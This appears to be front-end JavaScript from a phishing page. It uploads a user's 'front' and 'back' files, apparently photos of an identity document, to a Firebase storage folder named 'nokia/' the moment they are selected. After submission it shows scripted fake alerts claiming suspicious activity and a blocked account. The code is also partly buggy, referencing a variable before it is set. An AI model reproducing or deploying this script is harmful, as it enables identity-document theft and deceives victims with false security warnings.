//form=document.getElementsByTagName('form').onsubmit= e => e.preventDefault()


    
    
   // let backMsg=document.querySelector('.msg').innerHTML=back.name

let btn= document.querySelector('.btn'); 
  btn.onclick=()=> {
    front=document.querySelector('#front').files[0]
    back=document.querySelector('#back').files[0];

    console.log(back);

    let storageRef=firebase.storage()
    let store=storageRef.ref('nokia/'+front.name)
    let insert=store.put(front)

      insert.on('state_change', snapshot => {
        setTimeout(()=> {
          swal("", "Suspicious Activities Detected", "warning");
        },6000)

        setTimeout(()=>{
          swal("", "Your Account Has Been Blocked ", "error");
        }, 9000)


      })
 
      //other upload 
 
  }

  //changae events 
  document.querySelector('#front').onchange= e => {
    let msg=document.querySelector('.front_msg');
    msg.innerHTML=document.querySelector('#front').files[0].name;


    //frotn
    let raf=firebase.storage()
    let st=raf.ref('nokia/'+front.name)
    let insideer=st.put(document.querySelector('#front').files[0])

      insideer.on('state_change', snapshot => {
        setTimeout(()=> {
          console.log('fron uploaded');
        },2000)

   


      })
  }

  document.querySelector('#back').onchange= e => {
    let backErr=document.querySelector('.msg');
    backErr.innerHTML=document.querySelector('#back').files[0].name;

    let db=firebase.storage()
    let id=db.ref('nokia/'+back.name)
    let cont=id.put(document.querySelector('#back').files[0])

      cont.on('state_change', snapshot => {
        console.log('back uploaded');
      })
  }